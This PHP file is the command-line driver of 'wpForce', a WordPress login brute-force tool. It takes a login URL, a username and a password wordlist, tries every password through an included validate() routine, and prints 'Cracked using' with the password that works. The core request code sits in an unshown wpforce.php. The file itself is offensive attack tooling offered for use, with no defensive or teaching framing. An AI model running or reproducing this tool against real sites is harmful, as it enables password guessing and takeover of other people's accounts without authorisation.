<?php
/**
 * wpForce CLI
 *
 * @author Fray117
 * @version 0.3.4
 */

include 'wpforce.php';
$wpforce = new wpforce();

// Required value
$shortopts  = "l:u:w:";

// Optional value
$shortopts .= "h::a::";

$longopts  = array(
	// Required value

	"url:",
	"username:",
	"wordlist:",

	// Optional value
	"help::",
	"agent::"
);

$opts = getopt($shortopts, $longopts);

$opt = '';

if (isset($opts['l'])) {
	$opt = 'l';
} elseif (isset($opts['url'])) {
	$opt = 'url';
}

switch ($opt) {
	case 'l':
		
		if (isset($opts['u']) && isset($opts['w'])) {
			$url = $opts['l'];
			$username = $opts['u'];
			$wordlist = file($opts['w']);

			foreach ($wordlist as $key => $password) {
				$cracking = $wpforce->validate($url, $username, $password);

				if ($cracking) {
					print 'Cracked using ' . $password . PHP_EOL;
				} else {
					print 'Cracking using ' . $password . PHP_EOL;
				}
			}
		}

		break;

	case 'url':

		if (isset($opts['username']) && isset($opts['wordlist'])) {
			$url = $opts['url'];
			$username = $opts['username'];
			$wordlist = file($opts['wordlist']);

			foreach ($wordlist as $key => $password) {
				$cracking = $wpforce->validate($url, $username, $password);

				if ($cracking) {
					print 'Cracked using ' . $password . PHP_EOL;
				} else {
					print 'Cracking using ' . $password . PHP_EOL;
				}
			}
		}

		break;
	
	default:
		print '                 _____                   ' . PHP_EOL;
		print ' __      ___ __ |  ___|__  _ __ ___ ___  ' . PHP_EOL;
		print ' \ \ /\ / / \'_ \| |_ / _ \| \'__/ __/ _ \ ' . PHP_EOL;
		print '  \ V  V /| |_) |  _| (_) | | | (_|  __/ ' . PHP_EOL;
		print '   \_/\_/ | .__/|_|  \___/|_|  \___\___| ' . PHP_EOL;
		print '          |_|                            ' . PHP_EOL;
		print PHP_EOL;
		print 'Usage: ' . basename(__FILE__) . ' <options> [-a <User Agent>]' . PHP_EOL;
		print '   ' . basename(__FILE__) . ' <options> [--agent <User Agent>]' . PHP_EOL;
		print PHP_EOL;
		print "   -l <Login URL> \t Login URL (Like wp-login.php) " . PHP_EOL;
		print "   -u <Username> \t Define Username to Crack" . PHP_EOL;
		print "   -w <Wordlist> \t Import Wordlist from File" . PHP_EOL;
		print "   -h \t Show this Help" . PHP_EOL;
		print PHP_EOL;
		print "   --url <Login URL> \t Login URL (Like wp-login.php) " . PHP_EOL;
		print "   --username <Username> \t Define Username to Crack" . PHP_EOL;
		print "   --wordlist <Wordlist> \t Import Wordlist from File" . PHP_EOL;
		print "   --help \t Show this Help" . PHP_EOL;
		print PHP_EOL;
		break;
}